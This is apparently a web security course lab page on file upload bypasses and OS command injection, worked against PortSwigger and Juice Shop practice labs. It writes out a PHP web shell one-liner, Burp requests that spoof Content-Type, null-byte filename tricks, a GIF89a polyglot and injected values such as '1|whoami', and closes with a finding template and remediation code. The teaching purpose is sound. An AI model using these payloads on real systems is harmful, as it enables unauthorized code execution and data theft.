Lab 06: File Upload to Web Shell & Command Injection

Every lab so far stayed inside the application: the database, the browser, another user's cart. Today you break out to the operating system. You'll discover exposed misconfigurations, slip a PHP script past upload filters, and chain OS commands so the server executes your code as the web server user (such as www-data).

1. How a Web Request Becomes an OS Shell

🔥
Case Study: 147 Million Records Exposed via an Unpatched Web Framework

In May 2017, attackers hit Equifax's consumer dispute portal through an Apache Struts flaw (CVE-2017-5638, CVSS 10.0) where a crafted HTTP Content-Type header got parsed as OGNL code and executed OS commands on the server. They dropped web shells to hold access and moved across internal networks for 76 days before detection, exposing Social Security numbers and personal data for roughly 147 million people.

The patch had been out since March 7, 2017. That whole breach began the way today's lab does: an HTTP request that the web server ran as code instead of treating as data.

Source: U.S. House Committee on Oversight and Government Reform: The Equifax Data Breach (Dec 2018) ↗

A web server handles a requested file in one of two completely different ways. It either reads a static file off disk and ships the raw bytes back, or it hands an executable script (like .php) to an interpreter that runs the code on the server's operating system and returns the output.

STATIC FILE SERVING vs. SERVER-SIDE EXECUTION OWASP A02 · MITRE T1505.003

Static File (cat.jpg)

bytes only 
GET /files/avatars/cat.jpg HTTP/1.1
→ Apache reads bytes from disk
→ sends Content-Type: image/jpeg
→ nothing runs on the server

Even if a .jpg file contains <?php ... ?> text inside it, a normal server treats it as image data and never hands it to PHP.

Web Shell (exploit.php)

runs on OS 
GET /files/avatars/exploit.php?cmd=id HTTP/1.1
→ Apache sees .php, invokes PHP interpreter
→ PHP calls system("id") in /bin/sh
→ stdout returns in the HTTP 200 body

That single line, <?php system($_GET['cmd']); ?>, turns an upload folder into a remote command prompt running as the web user.

HOW A WEB REQUEST EXECUTES ON THE UNDERLYING LINUX HOST
🤔 An avatar form rejects shell.php because only image extensions are allowed. You rename the exact same PHP file to shell.jpg and the upload succeeds. When you browse to /files/avatars/shell.jpg, do you get code execution?
Answer

No. Unless the web server is misconfigured to pass .jpg files through PHP, Apache serves shell.jpg as raw bytes and your PHP code sits there unread. Getting code execution requires a file that both clears the upload filter and still gets executed by an interpreter.

🤔 The server's verbose error told you the exact rule: the filename must end in .md or .pdf. You want package.json.bak. How can a single filename string end in .md when the filter checks it, yet resolve to package.json.bak when the file is opened?
Answer

A poison null byte (%2500). The filter checks whether the string ends in .md first, then a helper function truncates everything from the null byte onward before opening the file on disk. Sending package.json.bak%2500.md makes the filter see .md while the file handler opens package.json.bak.

Step 2 · Bypass the Allowlist with Double-Encoded Null Byte (%2500) Parser Split

Look at why double-encoding (%2500 instead of %00) is required in Juice Shop's actual backend code (routes/fileServer.ts and lib/insecurity.ts):

Juice Shop source (routes/fileServer.ts & lib/insecurity.ts) · why %2500 works
// 1. Express URL-decodes params.file ONCE on arrival:
//    "package.json.bak%2500.md"  -->  "package.json.bak%00.md"  (%25 becomes %)
//    (If you sent raw %00, Express decodes it to \x00 and Node rejects the path.)

// 2. routes/fileServer.ts checks the ending BEFORE stripping the null byte:
if (file && (endsWithAllowlistedFileType(file) || (file === 'incident-support.kdbx'))) {
  file = security.cutOffPoisonNullByte(file) // looks for literal '%00', cuts off '%00.md'
  res.sendFile(path.resolve('ftp/', file))   // opens ftp/package.json.bak!
}

On a real target you don't know where secrets live before you're in. Passing $_GET['cmd'] into system() lets you run arbitrary discovery commands (id, ls, env, cat) over HTTP without ever re-uploading a new file.

4. Bypassing Upload Filters: Content-Type, Extensions & Magic Bytes

Real upload endpoints usually block raw .php uploads, yet developers frequently validate the wrong property. Below are the three classic server checks and the exact parser discrepancy that bypasses each one.

Step 4a · Spoof the Content-Type Header in Burp Repeater MIME Header Bypass

Open PortSwigger's second lab: Lab: Web shell upload via Content-Type restriction bypass ↗. Uploading exploit.php fails with a message saying only image/jpeg or image/png MIME types are allowed. Send POST /my-account/avatar to Burp Repeater and change only the part's Content-Type line:

Burp Repeater · keep filename="exploit.php", lie about Content-Type
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg          # changed from application/x-php or application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--

The server trusts the browser-supplied Content-Type header, accepts exploit.php onto disk, and Apache still executes it via GET /files/avatars/exploit.php?cmd=cat+/home/carlos/secret because the filename ends in .php.

🤔 Now the server stops trusting Content-Type and checks the filename extension instead, rejecting anything that isn't JPG or PNG. Using the null-byte trick from Section 2, what filename in Burp's Content-Disposition header satisfies the .jpg check while saving as exploit.php?
Answer

exploit.php%00.jpg. Notice why single %00 works inside multipart/form-data here whereas Juice Shop's URL path needed %2500: an HTTP header parameter isn't pre-decoded by an Express URL router before the upload handler reads it, so the lab's upload parser inspects .jpg first and then URL-decodes/truncates at %00 when saving to disk.

Step 4b · Null-Byte Obfuscation & Overlooked Extensions Extension Bypass

Open PortSwigger's third lab: Lab: Web shell upload via obfuscated file extension ↗. Upload exploit.php, catch the blocked POST /my-account/avatar in Burp Repeater, and rewrite the filename:

Burp Repeater · null-byte truncation in Content-Disposition
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
Content-Type: application/x-php

The upload confirmation says exploit.php was uploaded (confirming truncation at %00). Request GET /files/avatars/exploit.php?cmd=cat+/home/carlos/secret to solve it. On servers that block .php with a naive blacklist instead of an allowlist, pentesters also test secondary PHP extensions (.phtml, .phar, .php5, .pHp) or overwrite server rules via .htaccess.

What if the Server Checks the File Bytes (Magic Bytes)?

Harder upload forms ignore both Content-Type and the filename, and inspect the first bytes of the file using functions like PHP's exif_imagetype() or finfo_file(). A plain text file starting with <?php gets rejected immediately.

How Magic-Byte Checks Read Files

First 4–6 Bytes 
GIF image:  47 49 46 38 39 61   ("GIF89a")
PNG image:  89 50 4E 47 0D 0A   ("\x89PNG\r\n")
JPEG image: FF D8 FF E0

finfo_file() and exif_imagetype() inspect those opening header bytes to decide what the file is. If the file starts with <?php, they reject it as text/x-php.

The GIF89a Polyglot Trick

Valid Header + PHP 
GIF89a<?php system($_GET['cmd']); ?>

Because PHP only executes code inside <?php ... ?> and prints everything outside verbatim, prepending GIF89a passes leading magic-byte checks as image/gif while still executing PHP. (Full parsers like getimagesize() also expect width/height bytes or valid EXIF comments.)

5. OS Command Injection & Reverse Shells

You don't always need an upload form to reach the operating system. Whenever a backend glues user input into a shell command (checking stock, pinging an IP, converting a file), shell metacharacters break out of the argument and execute arbitrary commands.

IN-BAND COMMAND INJECTION vs. REVERSE SHELL MITRE T1059
🤔 A product stock checker sends POST /product/stock with productId=1&storeId=1, and the server builds a shell string: stockreport.pl <productId> <storeId>. What value do you put into storeId to also run whoami?
Answer

1|whoami (or 1;whoami or URL-encoded 1%26whoami). The pipe | tells /bin/sh to send the output of stockreport.pl 1 1 into whoami and return whoami's stdout in the response.

Parser Trap: Why Raw & Fails in Form Bodies

Raw & Splits the HTTP Form

never hits shell 
productId=1&storeId=1&whoami
→ HTTP parser splits on "&"
→ storeId = "1", extra param "whoami" = ""
→ /bin/sh never sees "whoami"

Use |, ;, or %26

reaches /bin/sh 
productId=1&storeId=1|whoami
productId=1&storeId=1%26whoami
→ HTTP parser keeps full value in storeId
→ /bin/sh executes stockreport.pl 1 1|whoami

Starting in Week 7–9 on TryHackMe's VPN, both your machine and the target share a private lab subnet, which is where you catch live reverse shells and escalate from www-data to root.

6. Write the Finding & How Developers Fix It

When a web bug gives arbitrary operating system command execution, it jumps straight to Critical. Here's how to write the finding and fix both root causes on the server.

FINDING: Unrestricted File Upload & OS Command Injection Leading to RCE Severity: Critical (CVSS 9.1 / 9.8)
TitleUnrestricted File Upload and OS Command Injection Yielding Remote Code Execution
SeverityCritical · CVSS 9.1 (authenticated upload RCE) / CVSS 9.8 (unauthenticated OS command injection)
Affected endpointsPOST /my-account/avatar + GET /files/avatars/<file>; POST /product/stock (storeId parameter)
Steps to reproduce1. Upload exploit.php containing <?php system($_GET['cmd']); ?> (spoofing Content-Type: image/jpeg or filename="exploit.php%00.jpg" where naive filters exist).
2. Request GET /files/avatars/exploit.php?cmd=id → returns the web server user's UID/username (e.g., www-data) and allows reading /home/carlos/secret.
3. On POST /product/stock, send productId=1&storeId=1|whoami → OS username executes and returns in the response.
ImpactArbitrary OS command execution on the application host as the web server user, exposing application secrets, database credentials, and internal network pivot paths.
Remediation1. Validate uploads using a strict extension allowlist and real image parsing/re-encoding, rename files randomly server-side, and store uploads outside the web root with script execution disabled.
2. Never build shell command strings from user input; invoke parameterized OS APIs (execFile / subprocess.run(..., shell=False)) and validate IDs strictly as integers.

The Fix, Side by Side

Vulnerable: Trusts Filename & Shell String

RCE 
// PHP upload: saves client filename in executable web root
move_uploaded_file($tmp, "/var/www/html/avatars/" . $name);

// Node.js command: glues input into /bin/sh string
exec("stockreport.pl " + productId + " " + storeId);

✅ Secure: Inert Storage & No Shell

locked down 
// PHP upload: verify/re-encode image, random ID, non-exec path
$safe = bin2hex(random_bytes(16)) . ".jpg";
move_uploaded_file($tmp, "/srv/non_exec_uploads/" . $safe);

// Node.js command: validate integer & pass argument array (no shell)
execFile("/usr/local/bin/stockreport.pl", [intId, intStore]);

Look at the thread across Labs 05 and 06: Content-Type, filename, BasketId, and storeId all arrive from an untrusted client. Never let the server execute a filename, header, or string the user chose.
